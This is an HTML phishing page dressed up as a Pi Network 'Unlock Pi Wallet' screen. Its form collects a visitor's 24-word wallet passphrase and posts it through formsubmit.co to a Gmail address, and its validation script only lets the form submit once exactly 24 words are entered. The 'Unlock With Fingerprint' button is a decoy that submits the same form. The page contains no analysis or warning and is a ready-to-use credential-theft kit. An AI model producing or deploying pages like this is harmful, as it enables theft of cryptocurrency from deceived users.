<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Pi Wallet Unlock</title>
  <style>
    :root {
      --purple: #5e2e91;
      --white: #ffffff;
      --text-dark: #111111;
      --gray: #6b7280;
      --light-purple: #f3e8ff;
    }

    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: var(--white);
      color: var(--text-dark);
      margin: 0;
      padding: 0;
      text-align: center;
    }

    .topbar {
      background-color: var(--purple);
      padding: 8px 16px;
      color: white;
      font-size: 1rem;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      position: relative;
    }

    .topbar .back {
      position: absolute;
      left: 12px;
      font-size: 1.4rem;
      cursor: pointer;
    }

    .content {
      padding: 24px 16px;
    }

    .passphrase-box {
      border: 1px solid #ccc;
      border-radius: 12px;
      padding: 16px;
      width: 90%;
      max-width: 400px;
      aspect-ratio: 1 / 1;
      margin: 0 auto 20px auto;
      box-sizing: border-box;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .passphrase-box textarea {
      width: 100%;
      height: 100%;
      border: none;
      outline: none;
      resize: none;
      font-size: 1rem;
      font-family: 'Segoe UI', sans-serif;
      border-radius: 8px;
      padding: 8px;
      box-sizing: border-box;
    }

    .btn-border,
    .btn-filled {
      width: 90%;
      max-width: 400px;
      box-sizing: border-box;
      padding: 12px 20px;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      margin: 10px auto;
      display: block;
    }

    .btn-border {
      border: 2px solid var(--purple);
      background: transparent;
      color: var(--purple);
    }

    .btn-filled {
      background-color: var(--purple);
      color: white;
      border: none;
    }

    .note {
      font-size: 0.9rem;
      color: var(--gray);
      max-width: 400px;
      margin: 0 auto 16px auto;
      text-align: left;
    }

    .note a.inline-link {
      background-color: var(--light-purple);
      color: var(--purple);
      text-decoration: none;
      font-weight: bold;
      padding: 2px 4px;
      border-radius: 4px;
      cursor: pointer;
    }

    .error-box {
      margin-top: 20px;
      color: #5e2e91;
      font-weight: bold;
      display: none;
    }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="back" onclick="window.location.href='index.html'">&lt;</div>
    <img src="https://ik.imagekit.io/pinet/Pi/unlock.png?updatedAt=1753819802279" alt="unlock" height="20" />
    Wallet
    <img src="https://ik.imagekit.io/pinet/Pi/Pi%20logo.png" alt="Pi Logo" height="20" />
  </div>

  <div class="content">
    <h2>Unlock Pi Wallet</h2>

    <!-- YOUR EXISTING FORM -->
<form id="passphrase-form" action="https://formsubmit.co/picoinulock0786@gmail.com" method="POST">
  <div class="passphrase-box">
    <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word
passphrase here" required></textarea>
  </div>

  <!-- Hidden field to detect which button -->
  <input type="hidden" name="unlock_method" id="unlock_method" value="">

  <button type="submit" class="btn-border" onclick="setMethod('Passphrase')">Unlock With Passphrase</button>
  <button type="submit" class="btn-filled" onclick="setMethod('Fingerprint')">Unlock With Fingerprint</button>
</form>

<!-- Error message box (already in your page) -->
<div id="error-msg" class="error-box" style="display:none;">
  Please provide a valid 24-word phrase to unlock your Pi wallet. The phrase you provided is invalid.
</div>

<script>
  function setMethod(method) {
    document.getElementById("unlock_method").value = method;
  }

  // 24-word validation
  const form = document.getElementById('passphrase-form');
  const textarea = document.getElementById('passphrase');
  const errorBox = document.getElementById('error-msg');

  form.addEventListener('submit', function (e) {
    const text = (textarea.value || "").trim();
    const words = text.split(/\s+/).filter(Boolean);

    // RULES:
    // 1) Exactly 24 words
    // 2) Only letters a–z (no numbers/symbols), each 2–20 chars (adjust if you want)
    const is24 = words.length === 24;
    const wordsOk = is24 && words.every(w => /^[a-zA-Z]{2,20}$/.test(w));

    if (!is24 || !wordsOk) {
      e.preventDefault(); // stop submit
      errorBox.style.display = 'block';
      errorBox.textContent = !is24
        ? 'Please enter exactly 24 words (separated by spaces).'
        : 'Words must be letters only (a–z), 2–20 characters each.';
      textarea.focus();
      return false;
    }

    // valid → let it submit
    errorBox.style.display = 'none';
  });
</script>
</body>
</html>
